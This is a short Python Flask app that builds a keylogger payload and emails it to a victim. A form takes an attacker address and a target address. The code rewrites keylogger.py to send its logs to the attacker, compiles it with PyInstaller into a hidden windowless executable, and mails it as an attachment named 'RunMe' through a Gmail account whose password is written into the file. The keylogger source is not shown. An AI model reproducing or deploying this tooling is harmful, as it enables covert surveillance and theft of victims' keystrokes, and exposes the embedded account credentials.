from flask import Flask,redirect,render_template,request,flash,url_for
import PyInstaller.__main__
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
app = Flask(__name__)

@app.route('/',methods=('GET','POST'))
def home():
    if request.method == 'POST':
        attacker = request.form['attacker']
        target = request.form['target']
        with open(r"keylogger.py", 'r+') as file:
            lines = file.readlines()
            file.seek(0)
            file.truncate()
            file.writelines(lines[:-1])
            file.write('sendMail("'+attacker+'")')
            file.close()
        PyInstaller.__main__.run([
            'keylogger.py',
            '--onefile',
            '--windowed'
        ])
        msg = MIMEMultipart()
        filename = "RunMe"
        attachment = open(r"dist/keylogger", "rb")
        p = MIMEBase('application', 'octet-stream')
        p.set_payload((attachment).read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
        msg.attach(p)
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login("spykeyph@gmail.com", "hpyekyps")
        text = msg.as_string()
        s.sendmail("spykeyph@gmail.com", target, text)
        s.quit()
        return render_template('res.html')
    return render_template('index.html')

@app.route('/res/',methods = ('GET','POST'))
def res():
    return render_template("res.html")

if __name__=='__main__':
    app.run(debug=True)